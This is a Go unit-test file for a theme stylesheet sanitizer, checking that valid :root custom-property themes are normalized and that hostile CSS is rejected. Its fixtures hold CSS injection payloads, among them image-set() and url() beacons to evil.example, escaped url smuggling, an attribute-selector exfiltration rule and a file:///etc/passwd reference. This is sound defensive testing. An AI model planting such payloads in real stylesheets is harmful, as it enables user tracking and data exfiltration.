package backend

import (
	"strings"
	"testing"
)

// coreTokens is the minimal valid declaration pair shared by most fixtures.
const coreTokens = "--color-background: #fff; --color-foreground: #000;"

// TestSanitizeThemeCSS_CanonicalOutput pins the canonical sanitized form:
// the header comment is preserved, declarations are whitespace-normalized
// and kept in source order, color-scheme is folded in, and inline comments
// disappear.
func TestSanitizeThemeCSS_CanonicalOutput(t *testing.T) {
	in := "/* c0wrk-theme: Paper | light */\n\n:root {\n  /* canvas */\n  --color-background   :   #faf8f2 ;\n  --color-foreground:#333;\n  color-scheme: light\n}\n"
	got, err := sanitizeThemeCSS(in)
	if err != nil {
		t.Fatalf("sanitize: %v", err)
	}
	want := strings.Join([]string{
		"/* c0wrk-theme: Paper | light */",
		":root {",
		"  --color-background: #faf8f2;",
		"  --color-foreground: #333;",
		"  color-scheme: light;",
		"}",
		"",
	}, "\n")
	if got != want {
		t.Fatalf("canonical form mismatch:\ngot:\n%s\nwant:\n%s", got, want)
	}
}

// TestSanitizeThemeCSS_RejectsImageSet guards the exact vector from the PR
// review: image-set() accepts a bare <string> treated as a URL and would let
// an injected stylesheet issue an outbound request.
func TestSanitizeThemeCSS_RejectsImageSet(t *testing.T) {
	cases := []string{
		`:root { --color-background: #fff; --color-foreground: #000; background-image: image-set("https://evil.example/beacon.png" 1x); }`,
		`:root { --color-background: #fff; --color-foreground: #000; -x: -webkit-image-set("https://evil.example/b.png" 1x); }`,
		// image-set smuggled into a custom property value
		`:root { --color-background: #fff; --color-foreground: #000; --icon: image-set("https://evil.example/b.png" 1x); }`,
		// image-set inside an allowlisted function must not sneak through
		`:root { --color-background: #fff; --color-foreground: #000; --icon: var(--x, image-set("https://evil.example/b.png" 1x)); }`,
	}
	for i, css := range cases {
		if err := ValidateThemeCSS(css); err == nil {
			t.Errorf("case %d: expected image-set rejection, got nil", i)
		}
	}
}

// TestSanitizeThemeCSS_RejectsEscapedConstructs guards escape-sequence
// smuggling: an escaped identifier (e.g. \75 rl → url) stays escaped in the
// token value and therefore fails the allowlist checks.
func TestSanitizeThemeCSS_RejectsEscapedConstructs(t *testing.T) {
	cases := []string{
		`:root { --color-background: #fff; --color-foreground: #000; --x: \75 rl(https://evil.example/x); }`,
		`@import url(data:text/css,:root{--color-background:#fff;--color-foreground:#000});`,
	}
	for i, css := range cases {
		if err := ValidateThemeCSS(css); err == nil {
			t.Errorf("case %d: expected rejection, got nil", i)
		}
	}
}

// TestSanitizeThemeCSS_RejectsAtRulesAndForeignRules guards the structural
// boundary: anything but a single :root custom-property rule is rejected —
// at-rules, other selectors, plain declarations.
func TestSanitizeThemeCSS_RejectsAtRulesAndForeignRules(t *testing.T) {
	cases := map[string]string{
		"at-import":            "@import url('x.css');\n:root { " + coreTokens + " }",
		"at-media":             "@media (min-width: 0) { :root { " + coreTokens + " } }",
		"at-theme":             "@theme { --color-background: #fff; }\n:root { " + coreTokens + " }",
		"at-supports":          "@supports (color: red) { :root { " + coreTokens + " } }",
		"plain-decl":           "color: red;\n:root { " + coreTokens + " }",
		"selector-html":        "html { " + coreTokens + " }\n:root { " + coreTokens + " }",
		"selector-body":        ":root { " + coreTokens + " }\nbody { background: url(https://evil.example/x.png); }",
		"two-root-rules":       ":root { " + coreTokens + " }\n:root { --accent: #528bff; }",
		"root-with-combinator": ":root, html { " + coreTokens + " }",
		"attribute-selector":   "input[value^=\"x\"] { background: url(https://evil.example/?x); }",
		"cdo-cdc":              "<!-- :root { " + coreTokens + " } -->",
	}
	for name, css := range cases {
		if err := ValidateThemeCSS(css); err == nil {
			t.Errorf("%s: expected rejection, got nil", name)
		}
	}
}

// TestSanitizeThemeCSS_RejectsHostileValues guards value-level attacks that
// survive structurally valid documents.
func TestSanitizeThemeCSS_RejectsHostileValues(t *testing.T) {
	cases := map[string]string{
		"external-url-unquoted":   ":root { " + coreTokens + " --icon: url(https://evil.example/i.svg); }",
		"external-url-quoted":     ":root { " + coreTokens + " --icon: url('https://evil.example/i.svg'); }",
		"protocol-relative":       ":root { " + coreTokens + " --icon: url(//evil.example/i.svg); }",
		"file-url":                ":root { " + coreTokens + " --icon: url(file:///etc/passwd); }",
		"relative-url":            ":root { " + coreTokens + " --icon: url(images/bg.png); }",
		"uppercase-scheme":        ":root { " + coreTokens + " --icon: url(HTTPS://EVIL.EXAMPLE/I.SVG); }",
		"disallowed-function":     ":root { " + coreTokens + " --x: env(user-agent); }",
		"element-function":        ":root { " + coreTokens + " --x: element(#secret); }",
		"unbalanced-parens":       ":root { " + coreTokens + " --x: rgba(0, 0, 0; }",
		"empty-value":             ":root { " + coreTokens + " --x: ; }",
		"bad-color-scheme":        ":root { " + coreTokens + " color-scheme: only light; }",
		"missing-required-tokens": ":root { --accent: #528bff; }",
	}
	for name, css := range cases {
		if err := ValidateThemeCSS(css); err == nil {
			t.Errorf("%s: expected rejection, got nil", name)
		}
	}
}

// TestSanitizeThemeCSS_AcceptsLegitimateValues keeps the authoring surface
// broad enough for real themes: colors in every literal form, triplets,
// var()/calc() chains, !important, data: URLs, quotes.
func TestSanitizeThemeCSS_AcceptsLegitimateValues(t *testing.T) {
	css := `/* c0wrk-theme: Kitchen Sink | dark */
:root {
  --color-background: #282c34;
  --color-foreground: #abb2bf;
  --color-shadow: rgba(0, 0, 0, 0.35);
  --color-alpha: rgb(82 139 255 / 50%);
  --color-hue: hsl(220, 13%, 55%);
  --color-triplet: 82, 139, 255;
  --size: calc(100% - 2 * var(--gap, 4px));
  --clamp: clamp(1rem, 2vw, 2rem);
  --icon: url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=);
  --icon-quoted: url("data:image/svg+xml,%3Csvg%3E%3C/svg%3E");
  --label: "quoted string";
  --z: 1.5e2;
  --fallback: var(--undefined, #fff) !important;
  color-scheme: dark;
}`
	got, err := sanitizeThemeCSS(css)
	if err != nil {
		t.Fatalf("legitimate theme must pass: %v", err)
	}
	// Spot-check a few canonical forms.
	for _, want := range []string{
		"--color-shadow: rgba(0, 0, 0, 0.35);",
		"--size: calc(100% - 2 * var(--gap, 4px));",
		"--icon: url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=);",
		"--fallback: var(--undefined, #fff) !important;",
		"color-scheme: dark;",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("sanitized output missing %q:\n%s", want, got)
		}
	}
}

// TestSanitizeThemeCSS_LastDeclarationWins pins the cascade semantics for
// duplicate custom properties inside one block.
func TestSanitizeThemeCSS_LastDeclarationWins(t *testing.T) {
	css := ":root { --color-background: #fff; --color-foreground: #000; --accent: #111; --accent: #222; }"
	got, err := sanitizeThemeCSS(css)
	if err != nil {
		t.Fatalf("sanitize: %v", err)
	}
	if strings.Contains(got, "#111") || !strings.Contains(got, "--accent: #222;") {
		t.Fatalf("last declaration must win:\n%s", got)
	}
}

// TestSanitizeThemeCSS_TrailingDeclarationWithoutSemicolon guards the
// optional trailing semicolon.
func TestSanitizeThemeCSS_TrailingDeclarationWithoutSemicolon(t *testing.T) {
	css := ":root { --color-background: #fff; --color-foreground: #000 }"
	if _, err := sanitizeThemeCSS(css); err != nil {
		t.Fatalf("trailing semicolon must be optional: %v", err)
	}
}

// TestThemeSlug_RejectsBuiltinAttributeKeys pins the newly reserved ids:
// a file slugged `light`/`dark` must not alias the data-theme keys written
// by the built-in themes.
func TestThemeSlug_RejectsBuiltinAttributeKeys(t *testing.T) {
	for _, in := range []string{"light.css", "Light.css", "DARK.css", "dark.css"} {
		if _, err := themeSlug(in); err == nil {
			t.Errorf("themeSlug(%q): expected reserved-id error, got nil", in)
		}
	}
}
